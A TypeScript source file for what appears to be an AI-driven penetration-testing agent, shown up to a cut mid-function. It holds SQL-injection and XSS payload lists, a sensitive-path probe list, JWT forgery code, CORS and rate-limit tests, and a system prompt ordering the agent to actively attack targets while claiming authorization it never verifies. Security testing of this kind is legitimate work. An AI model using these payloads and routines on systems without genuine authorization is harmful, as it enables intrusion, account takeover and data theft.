import { agentLoop } from "../core/ai.js";
import { logger } from "../core/logger.js";
import { parseFindings } from "./dependency.js";
import type { Finding } from "../core/types.js";
import type { ChatCompletionTool } from "openai/resources/chat/completions";

// ── Payload databases ─────────────────────────────────────────────────────────

const SQLI_PAYLOADS = [
  { p: "' OR '1'='1'--",                type: "auth_bypass" },
  { p: "' OR 1=1--",                    type: "auth_bypass" },
  { p: "admin'--",                       type: "auth_bypass" },
  { p: "' OR '1'='1",                   type: "auth_bypass" },
  { p: "'; SELECT SLEEP(3);--",         type: "time_based"  },
  { p: "'; SELECT pg_sleep(3);--",      type: "time_based"  },
  { p: "' AND SLEEP(3)--",              type: "time_based"  },
  { p: "'; WAITFOR DELAY '0:0:3'--",    type: "time_based"  },
  { p: "' UNION SELECT null,null--",    type: "union"       },
  { p: "' UNION SELECT null,null,null--", type: "union"     },
  { p: "'",                              type: "error"       },
  { p: "\"",                             type: "error"       },
  { p: "1' ORDER BY 100--",             type: "order_error" },
];

const XSS_PAYLOADS = [
  `<script>alert(document.domain)</script>`,
  `"><script>alert(1)</script>`,
  `'><img src=x onerror=alert(document.domain)>`,
  `<svg onload=alert(1)>`,
  `"><svg onload=alert(1)>`,
  `<img src=x onerror=alert(1)>`,
  `';alert(1)//`,
];

const SENSITIVE_PATHS = [
  "/.env", "/.env.local", "/.env.production", "/.env.development",
  "/.git/config", "/.git/HEAD",
  "/admin", "/admin/", "/administrator",
  "/api/debug", "/api/v1/users", "/api/users", "/api/admin",
  "/__debug__", "/debug", "/_debug",
  "/phpinfo.php", "/info.php",
  "/server-status", "/server-info",
  "/actuator", "/actuator/health", "/actuator/env", "/actuator/mappings",
  "/graphql", "/graphiql", "/playground",
  "/swagger.json", "/openapi.json", "/api-docs", "/swagger-ui.html",
  "/robots.txt", "/.well-known/security.txt",
  "/config.json", "/package.json",
  "/backup.sql", "/dump.sql",
  "/.DS_Store", "/web.config",
  "/wp-admin", "/wp-login.php",
  "/v1/users", "/v2/users",
  "/_next/source", "/__nuxt__",
];

const SQL_ERROR_PATTERNS = [
  /SQL syntax.*?MySQL/i,
  /Warning.*?mysql_/i,
  /MySqlClient\./i,
  /ORA-\d{4,}/i,
  /Oracle.*Driver/i,
  /PostgreSQL.*ERROR/i,
  /Warning.*?\Wpg_/i,
  /Npgsql\./i,
  /SQLite.*error/i,
  /sqlite3\.OperationalError/i,
  /SQLSTATE\[\d+\]/i,
  /Unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /syntax error at or near/i,
  /Microsoft.*ODBC.*SQL Server/i,
  /Incorrect syntax near/i,
  /Conversion failed when converting/i,
  /PG::SyntaxError/i,
];

// ── JWT utilities ─────────────────────────────────────────────────────────────

function jwtDecode(token: string): { header: Record<string, unknown>; payload: Record<string, unknown>; sig: string } | null {
  const parts = token.split(".");
  if (parts.length !== 3) return null;
  try {
    return {
      header:  JSON.parse(Buffer.from(parts[0]!, "base64url").toString()) as Record<string, unknown>,
      payload: JSON.parse(Buffer.from(parts[1]!, "base64url").toString()) as Record<string, unknown>,
      sig:     parts[2]!,
    };
  } catch { return null; }
}

function jwtEncode(header: Record<string, unknown>, payload: Record<string, unknown>, sig = ""): string {
  return [
    Buffer.from(JSON.stringify(header)).toString("base64url"),
    Buffer.from(JSON.stringify(payload)).toString("base64url"),
    sig,
  ].join(".");
}

// ── System prompt ─────────────────────────────────────────────────────────────

const SYSTEM = `You are BreachScope's active penetration testing agent — an expert ethical hacker with FULL AUTHORIZATION to test this target.

Your mission: authenticate, then ACTIVELY ATTACK the application to find REAL, exploitable vulnerabilities. Not theoretical. Confirmed.

═══════════════════════════════════════════════════════════════
SPA / SINGLE-PAGE APP HANDLING
═══════════════════════════════════════════════════════════════
Many modern apps are SPAs (React, Angular, Vue) with hash routing (/#/login) or client-side routing.
• After navigate(), always call wait(1500) to let the JS framework render
• After click() on a button, call wait(1000) before checking the result
• If get_interactive_elements() returns nothing, call wait(2000) then try again
• Use wait_for_selector(selector) to block until an element appears (e.g. nav bar after login)
• Login success on SPAs: URL changes away from /login, OR a nav/avatar element appears, OR cookies are set
• DO NOT give up on login after one attempt — try wait() + re-check before concluding it failed

═══════════════════════════════════════════════════════════════
PHASE 1 — AUTHENTICATION
═══════════════════════════════════════════════════════════════
• navigate() to the login URL, then wait(1500)
• get_interactive_elements() to see form fields
• fill() each field, then click() the submit button, then wait(2000)
• Check URL — if it changed away from the login page, you are logged in
• Call get_cookies() — look for session cookies or JWT tokens
• If still on login page, try wait_for_selector("nav") or wait(2000) and check again
• After login, note any JWT in cookies for later attacks

═══════════════════════════════════════════════════════════════
PHASE 2 — RECONNAISSANCE
═══════════════════════════════════════════════════════════════
• find_links() — map the full application, note URL patterns with IDs (e.g. /user/123, /invoice/abc)
• extract_api_endpoints() — discover all API routes the frontend talks to
• check_sensitive_paths() — always run this (/.env, /.git, admin panels, graphql, etc.)
• web_search("{app name or domain} CVE vulnerability 2024") — hunt known CVEs for detected stack
• web_search("{framework detected} security bypass") — e.g. "Next.js auth bypass", "Supabase RLS bypass"

═══════════════════════════════════════════════════════════════
PHASE 3 — ACTIVE ATTACKS
═══════════════════════════════════════════════════════════════

A. JWT ATTACKS (if any JWT token found in cookies or response)
   • Extract raw JWT from cookies or page HTML
   • tamper_jwt(token, "none_alg") → sends tampered token with alg:none via http_request
   • tamper_jwt(token, "admin_claim") → sets isAdmin/role/admin=true
   • tamper_jwt(token, "id_tamper") → sets sub/userId/id to "0", "1", or another user's ID
   • tamper_jwt(token, "kid_sqli") → injects SQLi in kid header field
   • For each tampered token: http_request("GET", protected_url, {"Authorization": "Bearer <tampered>"})
   • CONFIRMED if: 200 instead of 401/403, or admin content returned

B. SQL INJECTION
   • fuzz_sqli(url, param_name) — for each URL parameter you discovered
   • fuzz_form_sqli(form_selector, field_name) — for each form field (search, login, signup, profile)
   • CONFIRMED if: SQL error pattern in response, OR response time >2.8s for SLEEP payload, OR union data returned

C. XSS (Cross-Site Scripting)
   • fuzz_xss(url, param) — for URL parameters that appear reflected in the page
   • fuzz_form_xss(selector, field) — for form inputs that reflect back in UI
   • CONFIRMED if: payload appears unescaped in DOM, or alert dialog detected

D. IDOR / BOLA
   • After login, note your user ID from profile pages/cookies/JWT payload
   • For each URL with /user/{id}, /api/{resource}/{id}: http_request("GET", url_with_different_id, auth_headers)
   • Try IDs: your_id±1, 1, 2, 100, a known UUID variant
   • CONFIRMED if: other user's data is returned (not 403/404)

E. AUTH ENFORCEMENT
   • http_request("GET", "/dashboard", {}) — no auth headers, no cookies
   • http_request("GET", "/api/users", {}) — unauthenticated API call
   • http_request("GET", "/admin", {}) — unauthenticated admin access
   • CONFIRMED if: returns 200 with real content (not login redirect HTML)

F. CORS MISCONFIGURATION
   • check_cors(url, "https://evil.com") — does it reflect the evil origin?
   • check_cors(url, "null") — does it allow null origin?
   • check_cors(api_endpoint, "https://evil.com") — test API endpoints too
   • CONFIRMED if: Access-Control-Allow-Origin = evil.com/null AND Access-Control-Allow-Credentials = true

G. RATE LIMITING
   • check_rate_limit(login_url, "POST", 20) — rapid-fire 20 login attempts
   • CONFIRMED if: <5 requests get rate-limited (no 429/503/CAPTCHA after 10+ attempts = vulnerable)

H. SESSION & COOKIE SECURITY
   • get_cookies() — check ALL cookies for:
     - Missing HttpOnly (XSS can steal it)
     - Missing Secure (over plain HTTP)
     - SameSite=None without Secure (CSRF)
     - Short session token entropy (length <32)

I. SECURITY HEADERS
   • check_headers(url) — flag missing: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Permissions-Policy
   • Check for version-leaking: Server header, X-Powered-By

J. CSRF
   • navigate to settings/profile/payment pages
   • get_page_html() — look for hidden CSRF token fields
   • If no token on a state-changing form: CONFIRMED CSRF risk

═══════════════════════════════════════════════════════════════
OUTPUT
═══════════════════════════════════════════════════════════════
Return ONLY a JSON array. No markdown wrapper. Each finding:
{
  "id": "unique-id",
  "title": "concise title",
  "severity": "critical|high|medium|low",
  "category": "blackbox",
  "description": "EVIDENCE: exact payload used, response received, data observed",
  "remediation": "specific fix",
  "references": ["relevant URLs"]
}

Severity guide:
• critical — RCE, auth bypass yielding admin, SQLi with data extraction, broken auth giving access to all users' data
• high     — JWT bypass, IDOR exposing other users' data, stored XSS, sensitive path with secrets exposed
• medium   — reflected XSS, CSRF on sensitive actions, missing CSP+X-Frame combined, rate limit bypass on login
• low      — individual missing header, cookie flag issues, minor info leakage`;

// ── Tool definitions ──────────────────────────────────────────────────────────

const TOOLS: ChatCompletionTool[] = [
  {
    type: "function",
    function: {
      name: "navigate",
      description: "Navigate browser to URL. Returns title, final URL, and 2000-char HTML preview.",
      parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] },
    },
  },
  {
    type: "function",
    function: {
      name: "get_interactive_elements",
      description: "Get all inputs, buttons, and links on the current page with their selectors.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "fill",
      description: "Fill an input field by CSS selector.",
      parameters: {
        type: "object",
        properties: {
          selector: { type: "string" },
          value:    { type: "string" },
        },
        required: ["selector", "value"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "click",
      description: "Click an element. Use CSS selector or 'text=Button Text'.",
      parameters: {
        type: "object",
        properties: { selector: { type: "string" } },
        required: ["selector"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "get_page_html",
      description: "Get current page's full HTML (up to 20000 chars). Use to find JWT tokens, CSRF tokens, sensitive data.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "get_cookies",
      description: "Get all cookies with their security attributes (httpOnly, secure, sameSite, size, value).",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "find_links",
      description: "Get all unique links on the current page. Use to discover URL patterns with IDs for IDOR testing.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "go_back",
      description: "Navigate back to the previous page.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "check_headers",
      description: "Fetch a URL and return its HTTP response headers and status code.",
      parameters: {
        type: "object",
        properties: { url: { type: "string" } },
        required: ["url"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "http_request",
      description: "Make a raw HTTP request (bypassing browser session). Use for auth enforcement tests (no cookies), CORS tests with custom Origin, or authenticated API calls with specific headers. Set include_session=true to include your login cookies.",
      parameters: {
        type: "object",
        properties: {
          method:          { type: "string", enum: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"] },
          url:             { type: "string" },
          headers:         { type: "object", description: "Additional request headers as key-value pairs" },
          body:            { type: "string", description: "Request body (for POST/PUT)" },
          include_session: { type: "boolean", description: "Include the authenticated session cookies (default false for auth bypass tests)" },
        },
        required: ["method", "url"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "fuzz_sqli",
      description: "Test a URL query parameter for SQL injection using error-based, time-based, and union payloads. Returns which payloads got interesting responses.",
      parameters: {
        type: "object",
        properties: {
          url:   { type: "string", description: "Full URL to test" },
          param: { type: "string", description: "Query parameter name to inject into" },
        },
        required: ["url", "param"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "fuzz_form_sqli",
      description: "Fill a form field with SQL injection payloads and submit, looking for SQL errors in the response.",
      parameters: {
        type: "object",
        properties: {
          field_selector:  { type: "string", description: "CSS selector for the input field" },
          submit_selector: { type: "string", description: "CSS selector for the submit button" },
        },
        required: ["field_selector", "submit_selector"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "fuzz_xss",
      description: "Inject XSS payloads into a URL parameter and check if the payload is reflected unescaped in the DOM.",
      parameters: {
        type: "object",
        properties: {
          url:   { type: "string" },
          param: { type: "string", description: "Query parameter to inject" },
        },
        required: ["url", "param"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "tamper_jwt",
      description: "Decode a JWT token and return a tampered version for security testing. Operations: 'none_alg' (alg=none, no signature), 'admin_claim' (add isAdmin/role=admin), 'id_tamper' (change sub/userId to 0 or 1), 'kid_sqli' (SQLi in kid field), 'decode_only' (just show decoded contents).",
      parameters: {
        type: "object",
        properties: {
          token:     { type: "string", description: "The JWT token to analyze/tamper" },
          operation: { type: "string", enum: ["none_alg", "admin_claim", "id_tamper", "kid_sqli", "decode_only"] },
        },
        required: ["token", "operation"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "check_cors",
      description: "Test CORS configuration by sending a request with a malicious Origin header. Returns whether the origin is reflected and if credentials are allowed.",
      parameters: {
        type: "object",
        properties: {
          url:    { type: "string" },
          origin: { type: "string", description: "Malicious origin to test (e.g. 'https://evil.com' or 'null')" },
        },
        required: ["url", "origin"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "check_rate_limit",
      description: "Send N rapid requests to a URL to test rate limiting. Returns response codes and whether a lockout/429 was triggered.",
      parameters: {
        type: "object",
        properties: {
          url:    { type: "string" },
          method: { type: "string", enum: ["GET", "POST"], default: "POST" },
          count:  { type: "number", description: "Number of requests to send (max 25)" },
          body:   { type: "string", description: "Request body for POST requests" },
        },
        required: ["url", "count"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "check_sensitive_paths",
      description: "Probe the target for common sensitive paths: /.env, /.git/config, /admin, /graphql, /swagger.json, etc.",
      parameters: {
        type: "object",
        properties: {
          base_url: { type: "string", description: "Base URL of the application (e.g. https://example.com)" },
        },
        required: ["base_url"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "extract_api_endpoints",
      description: "Extract API endpoints discovered from network requests and page JavaScript. Returns a list of API paths the frontend is calling.",
      parameters: { type: "object", properties: {} },
    },
  },
  {
    type: "function",
    function: {
      name: "web_search",
      description: "Search for known CVEs, security advisories, or exploit techniques for a specific technology or domain. Use this to find known vulnerabilities in the detected stack.",
      parameters: {
        type: "object",
        properties: {
          query: { type: "string", description: "Search query — e.g. 'Next.js auth bypass CVE 2024', 'Supabase RLS misconfiguration', 'jwt none algorithm attack'" },
        },
        required: ["query"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "wait",
      description: "Pause for N milliseconds. Use after navigate() or click() on SPAs to let the JS framework render before reading the page.",
      parameters: {
        type: "object",
        properties: {
          ms: { type: "number", description: "Milliseconds to wait (max 5000)" },
        },
        required: ["ms"],
      },
    },
  },
  {
    type: "function",
    function: {
      name: "wait_for_selector",
      description: "Wait until a CSS selector appears on the page (up to 8s). Use after login to confirm the authenticated UI rendered.",
      parameters: {
        type: "object",
        properties: {
          selector: { type: "string", description: "CSS selector to wait for, e.g. 'nav', '.user-avatar', '#account-menu'" },
        },
        required: ["selector"],
      },
    },
  },
];

// ── Result type ───────────────────────────────────────────────────────────────

export interface AttackProbeResult {
  url: string;
  findings: Finding[];
  tokensUsed: number;
  pagesVisited: string[];
  attacksSummary: string[];
}

// ── Main function ─────────────────────────────────────────────────────────────

export async function runAttackProbe(
  url: string,
  credentials: { username: string; password: string; loginUrl?: string }
): Promise<AttackProbeResult> {
  let chromium: import("playwright").BrowserType;
  try {
    const pw = await import("playwright");
    chromium = pw.chromium;
  } catch {
    throw new Error(
      "Playwright is not installed or browser binaries are missing.\n" +
        "Run: npx playwright install chromium"
    );
  }

  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    ignoreHTTPSErrors: true,
  });
  const page = await context.newPage();

  // Shared state
  let sessionCookieHeader = "";
  const pagesVisited: string[] = [];
  const capturedApiEndpoints = new Set<string>();
  const networkLog: Array<{ url: string; status: number; headers: Record<string, string> }> = [];
  const attacksSummary: string[] = [];

  const baseOrigin = (() => {
    try { return new URL(url).origin; } catch { return url; }
  })();

  // Network listeners
  page.on("response", async (resp) => {
    try {
      const respUrl = resp.url();
      networkLog.push({ url: respUrl, status: resp.status(), headers: Object.fromEntries(Object.entries(resp.headers())) });

      if (respUrl.startsWith(baseOrigin)) {
        const rt = resp.request().resourceType();
        if (rt === "fetch" || rt === "xhr" || respUrl.includes("/api/")) {
          try { capturedApiEndpoints.add(new URL(respUrl).pathname); } catch { /* skip */ }
        }
      }

      // Update session cookies
      const cookies = await context.cookies([url]).catch(() => []);
      sessionCookieHeader = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
    } catch { /* ignore */ }
  });

  // ── Tool implementations ────────────────────────────────────────────────────

  async function navigate(targetUrl: string): Promise<string> {
    try {
      await page.goto(targetUrl, { waitUntil: "domcontentloaded", timeout: 15000 });
      const finalUrl = page.url();
      pagesVisited.push(finalUrl);
      const title = await page.title();
      const html = (await page.content()).slice(0, 2000);
      return JSON.stringify({ title, url: finalUrl, html_preview: html });
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function getInteractiveElements(): Promise<string> {
    try {
      const data = await page.evaluate(() => {
        const inputs = Array.from(document.querySelectorAll("input:not([type=hidden]), textarea, select")).map((el) => {
          const input = el as HTMLInputElement;
          let label = "";
          if (input.id) {
            const labelEl = document.querySelector(`label[for="${input.id}"]`);
            if (labelEl) label = labelEl.textContent?.trim() ?? "";
          }
          if (!label) label = input.placeholder ?? input.name ?? "";
          return {
            selector: input.name ? `input[name="${input.name}"]` : `input[type="${input.type ?? "text"}"]`,
            type:     input.type ?? el.tagName.toLowerCase(),
            name:     input.name,
            label,
          };
        });
        const buttons = Array.from(document.querySelectorAll("button, input[type=submit]")).map((el) => ({
          selector: `button`,
          text:     (el as HTMLElement).textContent?.trim().slice(0, 80) ?? "",
          type:     (el as HTMLInputElement).type ?? "button",
        }));
        const links = Array.from(document.querySelectorAll("a[href]")).slice(0, 30).map((el) => ({
          href: (el as HTMLAnchorElement).href,
          text: el.textContent?.trim().slice(0, 50) ?? "",
        }));
        return { inputs, buttons, links };
      });
      return JSON.stringify(data);
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function fill(selector: string, value: string): Promise<string> {
    try {
      await page.fill(selector, value);
      return JSON.stringify({ success: true });
    } catch (e) {
      return JSON.stringify({ success: false, error: String(e) });
    }
  }

  async function click(selector: string): Promise<string> {
    try {
      if (selector.startsWith("text=")) {
        await page.getByText(selector.slice(5)).first().click();
      } else {
        await page.click(selector);
      }
      await page.waitForLoadState("domcontentloaded").catch(() => {});
      pagesVisited.push(page.url());
      return JSON.stringify({ success: true, url_after: page.url() });
    } catch (e) {
      return JSON.stringify({ success: false, error: String(e) });
    }
  }

  async function getPageHtml(): Promise<string> {
    try {
      // Strip script tag contents — Angular/React bundles inflate HTML massively
      const html = (await page.content())
        .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, "<script>[stripped]</script>");
      return html.slice(0, 12000);
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function wait(ms: number): Promise<string> {
    await page.waitForTimeout(Math.min(ms, 5000));
    return JSON.stringify({ waited_ms: ms, current_url: page.url() });
  }

  async function waitForSelector(selector: string): Promise<string> {
    try {
      await page.waitForSelector(selector, { timeout: 8000 });
      return JSON.stringify({ found: true, selector, current_url: page.url() });
    } catch {
      return JSON.stringify({ found: false, selector, current_url: page.url() });
    }
  }

  async function getCookies(): Promise<string> {
    try {
      const cookies = await context.cookies();
      return JSON.stringify(
        cookies.map((c) => ({
          name:     c.name,
          value:    c.value.slice(0, 100) + (c.value.length > 100 ? "…" : ""),
          domain:   c.domain,
          httpOnly: c.httpOnly,
          secure:   c.secure,
          sameSite: c.sameSite,
          expires:  c.expires,
          size:     (c.name + c.value).length,
        }))
      );
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function findLinks(): Promise<string> {
    try {
      const links = await page.evaluate(() =>
        [...new Set(
          Array.from(document.querySelectorAll("a[href]"))
            .map((a) => (a as HTMLAnchorElement).href)
            .filter((h) => h.startsWith("http")),
        )].slice(0, 80)
      );
      return JSON.stringify(links);
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function goBack(): Promise<string> {
    try {
      await page.goBack({ waitUntil: "domcontentloaded" });
      return JSON.stringify({ url: page.url() });
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function checkHeaders(targetUrl: string): Promise<string> {
    const cached = networkLog.find((r) => r.url === targetUrl || r.url.startsWith(targetUrl));
    if (cached) return JSON.stringify({ status: cached.status, headers: cached.headers });
    try {
      const resp = await page.request.get(targetUrl, { timeout: 10000 });
      return JSON.stringify({ status: resp.status(), headers: Object.fromEntries(Object.entries(resp.headers())) });
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function httpRequest(
    method: string,
    reqUrl: string,
    headers: Record<string, string> = {},
    body?: string,
    includeSession = false,
  ): Promise<string> {
    try {
      const reqHeaders: Record<string, string> = { ...headers };
      if (includeSession && sessionCookieHeader) {
        reqHeaders["Cookie"] = sessionCookieHeader;
      }

      const resp = await fetch(reqUrl, {
        method,
        headers: reqHeaders,
        body: body ?? undefined,
        redirect: "manual",
        signal: AbortSignal.timeout(10000),
      });

      const respHeaders: Record<string, string> = {};
      resp.headers.forEach((v, k) => { respHeaders[k] = v; });

      const text = (await resp.text()).slice(0, 1500);
      return JSON.stringify({
        status:   resp.status,
        headers:  respHeaders,
        body:     text,
        redirected: resp.redirected,
      });
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function fuzzSqli(targetUrl: string, param: string): Promise<string> {
    attacksSummary.push(`SQLi fuzz: ${targetUrl} ?${param}`);
    const results: Array<Record<string, unknown>> = [];

    for (const { p, type } of SQLI_PAYLOADS) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, p);

        const start = Date.now();
        const resp = await fetch(testUrl.toString(), {
          headers: { Cookie: sessionCookieHeader },
          redirect: "manual",
          signal: AbortSignal.timeout(8000),
        });
        const elapsed = Date.now() - start;
        const body = (await resp.text()).slice(0, 800);

        const hasSqlError = SQL_ERROR_PATTERNS.some((r) => r.test(body));
        const isTimeBased = type === "time_based" && elapsed > 2800;
        const confirmed = hasSqlError || isTimeBased;

        results.push({ payload: p, type, status: resp.status, elapsed_ms: elapsed, confirmed, evidence: confirmed ? body.slice(0, 200) : undefined });

        if (confirmed) break; // Stop fuzzing on confirmation to avoid detection
        await new Promise((r) => setTimeout(r, 150)); // Gentle pacing
      } catch (e) {
        results.push({ payload: p, error: String(e) });
      }
    }

    return JSON.stringify(results);
  }

  async function fuzzFormSqli(fieldSelector: string, submitSelector: string): Promise<string> {
    attacksSummary.push(`Form SQLi fuzz: ${fieldSelector}`);
    const interestingResults: Array<Record<string, unknown>> = [];

    for (const { p, type } of SQLI_PAYLOADS.slice(0, 6)) {
      try {
        await page.fill(fieldSelector, p);
        await page.click(submitSelector);
        await page.waitForLoadState("domcontentloaded").catch(() => {});

        const html = await page.content();
        const hasSqlError = SQL_ERROR_PATTERNS.some((r) => r.test(html));
        if (hasSqlError) {
          const snippet = html.match(/<[^>]*>([^<]*(?:SQL|error|syntax|ORA)[^<]*)<\/[^>]*>/i)?.[1] ?? html.slice(0, 300);
          interestingResults.push({ payload: p, type, confirmed: true, evidence: snippet });
          break;
        }
      } catch (e) {
        interestingResults.push({ payload: p, error: String(e) });
      }
    }

    return JSON.stringify(interestingResults.length > 0 ? interestingResults : [{ result: "no_sqli_errors_detected" }]);
  }

  async function fuzzXss(targetUrl: string, param: string): Promise<string> {
    attacksSummary.push(`XSS fuzz: ${targetUrl} ?${param}`);
    const results: Array<Record<string, unknown>> = [];

    for (const payload of XSS_PAYLOADS) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);

        await page.goto(testUrl.toString(), { waitUntil: "domcontentloaded", timeout: 10000 });

        // Check if payload is reflected unescaped in DOM
        const html = await page.content();
        const unescaped = html.includes(payload);
        const escaped   = html.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));

        // Check for alert dialog (XSS executed)
        let dialogFired = false;
        page.once("dialog", async (dialog) => {
          dialogFired = true;
          await dialog.dismiss();
        });
        await page.waitForTimeout(500);

        results.push({
          payload,
          reflected_unescaped: unescaped,
          reflected_escaped:   escaped,
          alert_fired:         dialogFired,
          confirmed:           dialogFired || unescaped,
        });

        if (dialogFired || unescaped) break;
      } catch (e) {
        results.push({ payload, error: String(e) });
      }
    }

    // Navigate back to safe URL
    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 10000 }).catch(() => {});
    return JSON.stringify(results);
  }

  function tamperJwt(token: string, operation: string): string {
    attacksSummary.push(`JWT tamper: ${operation}`);
    const decoded = jwtDecode(token);
    if (!decoded) return JSON.stringify({ error: "Not a valid JWT (expected 3 parts)" });

    switch (operation) {
      case "decode_only":
        return JSON.stringify({ header: decoded.header, payload: decoded.payload });

      case "none_alg": {
        const h = { ...decoded.header, alg: "none" };
        const tampered = jwtEncode(h, decoded.payload, "");
        return JSON.stringify({ tampered_token: tampered, operation, description: "Algorithm set to 'none', signature removed" });
      }

      case "admin_claim": {
        const p = {
          ...decoded.payload,
          isAdmin: true,
          admin: true,
          role: "admin",
          roles: ["admin"],
          permissions: ["*"],
        };
        const tampered = jwtEncode(decoded.header, p, decoded.sig);
        return JSON.stringify({ tampered_token: tampered, original_payload: decoded.payload, new_payload: p, operation });
      }

      case "id_tamper": {
        const p = { ...decoded.payload };
        const idField = ["sub", "userId", "user_id", "id", "uid"].find((k) => k in p);
        if (idField) {
          const original = p[idField];
          p[idField] = typeof original === "number" ? (original === 1 ? 2 : 1) : "1";
          const tampered = jwtEncode(decoded.header, p, decoded.sig);
          return JSON.stringify({ tampered_token: tampered, field_changed: idField, original, new_value: p[idField], operation });
        }
        return JSON.stringify({ error: "No user ID field found in payload", payload_keys: Object.keys(p) });
      }

      case "kid_sqli": {
        const h = { ...decoded.header, kid: "' UNION SELECT NULL,NULL,NULL--" };
        const tampered = jwtEncode(h, decoded.payload, decoded.sig);
        return JSON.stringify({ tampered_token: tampered, operation, description: "SQL injection in kid header field" });
      }

      default:
        return JSON.stringify({ error: `Unknown operation: ${operation}` });
    }
  }

  async function checkCors(targetUrl: string, origin: string): Promise<string> {
    attacksSummary.push(`CORS test: ${targetUrl} origin=${origin}`);
    try {
      const resp = await fetch(targetUrl, {
        method: "OPTIONS",
        headers: {
          Origin:                        origin,
          "Access-Control-Request-Method": "GET",
          "Cookie":                      sessionCookieHeader,
        },
        signal: AbortSignal.timeout(8000),
        redirect: "manual",
      });

      const headers: Record<string, string> = {};
      resp.headers.forEach((v, k) => { headers[k] = v; });

      const allowOrigin      = headers["access-control-allow-origin"] ?? "";
      const allowCredentials = headers["access-control-allow-credentials"] ?? "";
      const originReflected  = allowOrigin === origin;
      const wildcardWithCreds = allowOrigin === "*" && allowCredentials === "true";
      const vulnerable       = (originReflected && allowCredentials === "true") || wildcardWithCreds;

      return JSON.stringify({
        status: resp.status,
        tested_origin: origin,
        allow_origin: allowOrigin,
        allow_credentials: allowCredentials,
        origin_reflected: originReflected,
        vulnerable,
        all_cors_headers: Object.fromEntries(
          Object.entries(headers).filter(([k]) => k.startsWith("access-control"))
        ),
      });
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  async function checkRateLimit(targetUrl: string, method: string, count: number): Promise<string> {
    attacksSummary.push(`Rate limit test: ${method} ${targetUrl} x${count}`);
    const clampedCount = Math.min(count, 25);
    const responses: Array<{ status: number; i: number }> = [];

    const batch = Array.from({ length: clampedCount }, (_, i) =>
      fetch(targetUrl, {
        method,
        headers: {
          "Content-Type": "application/json",
          Cookie: sessionCookieHeader,
        },
        body: method === "POST" ? JSON.stringify({ email: `test${i}@test.com`, password: `Password${i}!` }) : undefined,
        signal: AbortSignal.timeout(8000),
        redirect: "manual",
      })
        .then((r) => ({ status: r.status, i }))
        .catch(() => ({ status: 0, i }))
    );

    const results = await Promise.all(batch);
    responses.push(...results);

    const statusCodes     = responses.map((r) => r.status);
    const has429          = statusCodes.some((s) => s === 429);
    const has503          = statusCodes.some((s) => s === 503);
    const allSucceeded    = statusCodes.every((s) => s < 400 || s === 401 || s === 403);
    const rateLimitBypassed = !has429 && !has503 && clampedCount >= 10;

    return JSON.stringify({
      requests_sent:   clampedCount,
      status_breakdown: statusCodes.reduce((acc: Record<number, number>, s) => { acc[s] = (acc[s] ?? 0) + 1; return acc; }, {}),
      rate_limited:    has429 || has503,
      all_succeeded:   allSucceeded,
      likely_vulnerable: rateLimitBypassed,
    });
  }

  async function checkSensitivePaths(baseUrl: string): Promise<string> {
    attacksSummary.push(`Sensitive path scan: ${baseUrl}`);
    const exposed: Array<{ path: string; status: number; preview: string }> = [];

    for (const p of SENSITIVE_PATHS) {
      try {
        const resp = await fetch(baseUrl.replace(/\/$/, "") + p, {
          redirect: "manual",
          signal: AbortSignal.timeout(6000),
          headers: { "User-Agent": "Mozilla/5.0" },
        });
        if (resp.status === 200) {
          const body = (await resp.text()).slice(0, 200);
          // Filter out obvious HTML 404 pages served as 200
          const isRealContent = !body.includes("<!DOCTYPE") || p.endsWith(".json") || p.endsWith(".sql") || p.endsWith(".env");
          if (isRealContent || resp.status === 200) {
            exposed.push({ path: p, status: resp.status, preview: body.slice(0, 150) });
          }
        }
        await new Promise((r) => setTimeout(r, 80));
      } catch { /* skip */ }
    }

    return JSON.stringify({ checked: SENSITIVE_PATHS.length, exposed });
  }

  async function extractApiEndpoints(): Promise<string> {
    const fromNetwork = [...capturedApiEndpoints];

    // Also scan current page HTML for API patterns
    let fromHtml: string[] = [];
    try {
      const html = await page.content();
      const patterns = [
        /['"`](\/api\/[^'"`\s\\]{1,100})['"`]/g,
        /['"`](\/v\d+\/[^'"`\s\\]{1,100})['"`]/g,
        /fetch\(['"`](\/[^'"`\s\\]{1,100})['"`]/g,
